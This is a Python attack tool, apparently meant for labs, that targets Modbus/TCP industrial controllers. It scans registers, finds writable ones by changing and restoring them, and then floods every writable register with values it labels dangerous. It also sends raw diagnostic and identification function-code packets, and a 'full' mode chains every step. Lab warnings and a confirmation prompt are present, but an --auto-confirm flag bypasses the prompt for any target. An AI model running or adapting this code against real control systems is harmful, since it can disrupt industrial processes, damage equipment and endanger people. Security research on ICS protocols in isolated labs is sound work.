from pyModbusTCP.client import ModbusClient
import socket
import struct
import time
import logging
import argparse
import random

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')


class ModbusRecon:
    def __init__(self, target_host, target_port, attack_mode='scan'):
        self.target_host = target_host
        self.target_port = target_port
        self.attack_mode = attack_mode
        self.findings = {
            'holding_registers': [],
            'input_registers': [],
            'coils': [],
            'discrete_inputs': [],
            'writable_registers': []
        }

    def scan_registers(self, max_addr=1000):
        logging.info(f'[RECON] Scanning registers on {self.target_host}:{self.target_port}')
        logging.info(f'[RECON] Testing addresses 0-{max_addr}...')
        
        client = ModbusClient(host=self.target_host, port=self.target_port, 
                            timeout=1, auto_open=True, auto_close=True)
        
        if not client.open():
            logging.error('[RECON] Failed to connect to target')
            return
        
        logging.info('[RECON] Scanning holding registers (FC 3)...')
        for addr in range(0, max_addr, 10):
            try:
                regs = client.read_holding_registers(addr, 10)
                if regs:
                    for i, val in enumerate(regs):
                        self.findings['holding_registers'].append({
                            'address': addr + i,
                            'value': val
                        })
                    if addr % 100 == 0:
                        logging.info(f'[RECON] Progress: {addr}/{max_addr} addresses scanned')
            except:
                pass
            time.sleep(0.01)
        
        logging.info('[RECON] Scanning input registers (FC 4)...')
        for addr in range(0, max_addr, 10):
            try:
                regs = client.read_input_registers(addr, 10)
                if regs:
                    for i, val in enumerate(regs):
                        self.findings['input_registers'].append({
                            'address': addr + i,
                            'value': val
                        })
            except:
                pass
            time.sleep(0.01)
        
        client.close()
        
        logging.info('='*60)
        logging.info('[RECON] === SCAN RESULTS ===')
        logging.info(f'Holding registers found: {len(self.findings["holding_registers"])}')
        logging.info(f'Input registers found: {len(self.findings["input_registers"])}')
        
        if self.findings['holding_registers']:
            logging.info('\n[RECON] Sample holding registers:')
            for reg in self.findings['holding_registers'][:10]:
                logging.info(f'  Address {reg["address"]}: {reg["value"]}')
        
        logging.info('='*60)

    def test_write_access(self):
        logging.info('[RECON] Testing write access to holding registers...')
        
        if not self.findings['holding_registers']:
            logging.warning('[RECON] No registers found. Run scan first.')
            return
        
        client = ModbusClient(host=self.target_host, port=self.target_port,
                            timeout=1, auto_open=True, auto_close=True)
        
        if not client.open():
            logging.error('[RECON] Failed to connect')
            return
        
        for reg in self.findings['holding_registers'][:50]:
            addr = reg['address']
            original = reg['value']
            
            try:
                test_val = (original + 1) % 65536
                success = client.write_single_register(addr, test_val)
                
                if success:
                    verify = client.read_holding_registers(addr, 1)
                    if verify and verify[0] == test_val:
                        self.findings['writable_registers'].append(addr)
                        logging.warning(f'[RECON] WRITABLE register found: {addr}')
                        
                        client.write_single_register(addr, original)
            except:
                pass
            
            time.sleep(0.02)
        
        client.close()
        
        logging.info(f'[RECON] Found {len(self.findings["writable_registers"])} writable registers')

    def dangerous_writes(self):
        logging.warning('[INJECT] Starting dangerous write injection...')
        
        if not self.findings['writable_registers']:
            logging.error('[INJECT] No writable registers found. Run recon first.')
            return
        
        client = ModbusClient(host=self.target_host, port=self.target_port,
                            timeout=1, auto_open=True, auto_close=True)
        
        if not client.open():
            logging.error('[INJECT] Failed to connect')
            return
        
        dangerous_values = [
            0,
            65535,
            0xDEAD,
            0xBEEF,
            32767,
            32768,
        ]
        
        for addr in self.findings['writable_registers']:
            for val in dangerous_values:
                try:
                    success = client.write_single_register(addr, val)
                    if success:
                        logging.warning(f'[INJECT] Wrote {val} (0x{val:04X}) to register {addr}')
                    time.sleep(0.1)
                except:
                    pass
        
        client.close()
        logging.warning('[INJECT] Dangerous write injection completed')

    def raw_function_codes(self):
        logging.warning('[INJECT] Sending dangerous function codes...')
        
        dangerous_funcs = [
            (8, b'\x00\x00'),
            (11, b''),
            (17, b''),
            (43, b'\x0E\x01\x00'),
        ]
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        
        try:
            sock.connect((self.target_host, self.target_port))
            
            for func_code, data in dangerous_funcs:
                trans_id = random.randint(0, 65535)
                length = 1 + len(data) + 1
                
                packet = struct.pack('>HHH', trans_id, 0, length)
                packet += struct.pack('BB', 1, func_code)
                packet += data
                
                sock.send(packet)
                logging.warning(f'[INJECT] Sent function code {func_code}')
                
                try:
                    response = sock.recv(1024)
                    if response:
                        logging.info(f'[INJECT] Got response: {response.hex()}')
                except:
                    pass
                
                time.sleep(0.1)
        
        except Exception as e:
            logging.error(f'[INJECT] Error: {e}')
        finally:
            sock.close()

    def run(self):
        logging.warning('='*60)
        logging.warning(f'[RECON] Starting attack mode: {self.attack_mode}')
        logging.warning(f'[RECON] Target: {self.target_host}:{self.target_port}')
        logging.warning('='*60)
        
        if self.attack_mode == 'scan':
            self.scan_registers(max_addr=1000)
            self.test_write_access()
        
        elif self.attack_mode == 'inject':
            self.scan_registers(max_addr=100)
            self.test_write_access()
            time.sleep(1)
            self.dangerous_writes()
        
        elif self.attack_mode == 'raw_funcs':
            self.raw_function_codes()
        
        elif self.attack_mode == 'full':
            self.scan_registers(max_addr=500)
            self.test_write_access()
            time.sleep(1)
            self.dangerous_writes()
            time.sleep(1)
            self.raw_function_codes()
        
        logging.warning('[RECON] Attack completed')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Modbus reconnaissance and command injection (USE ONLY IN LAB)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack modes:
  scan        - Scan for readable/writable registers
  inject      - Write dangerous values to registers
  raw_funcs   - Send dangerous raw function codes
  full        - Complete attack chain (all of the above)

Examples:
  python modbus_recon_inject.py --target 127.0.0.1 --mode scan
  python modbus_recon_inject.py --target 192.168.1.10 --mode full
  python modbus_recon_inject.py --target 127.0.0.1 --mode raw_funcs
        """
    )
    
    parser.add_argument('--target', required=True, help='Target Modbus server IP')
    parser.add_argument('--port', type=int, default=502, help='Target port')
    parser.add_argument('--mode', choices=['scan', 'inject', 'raw_funcs', 'full'],
                       default='scan', help='Attack mode')
    parser.add_argument('--auto-confirm', action='store_true', help='Auto confirm attack without prompt')
    
    args = parser.parse_args()
    
    # Auto-confirm for localhost or when --auto-confirm is set
    if args.target in ['127.0.0.1', 'localhost'] or args.auto_confirm:
        print('='*60)
        print('WARNING: This tool performs attacks on Modbus systems.')
        print('It can disrupt operations and damage equipment.')
        print('USE ONLY in isolated lab environments you control.')
        print('='*60)
        print(f'Attacking {args.target}:{args.port} with mode {args.mode}')
        
        recon = ModbusRecon(
            target_host=args.target,
            target_port=args.port,
            attack_mode=args.mode
        )
        
        recon.run()
    else:
        print('='*60)
        print('WARNING: This tool performs attacks on Modbus systems.')
        print('It can disrupt operations and damage equipment.')
        print('USE ONLY in isolated lab environments you control.')
        print('='*60)
        response = input(f'Attack {args.target}:{args.port} with mode {args.mode}? (yes/no): ')
        
        if response.lower() != 'yes':
            print('Attack cancelled.')
            exit(0)
        
        recon = ModbusRecon(
            target_host=args.target,
            target_port=args.port,
            attack_mode=args.mode
        )
        
        recon.run()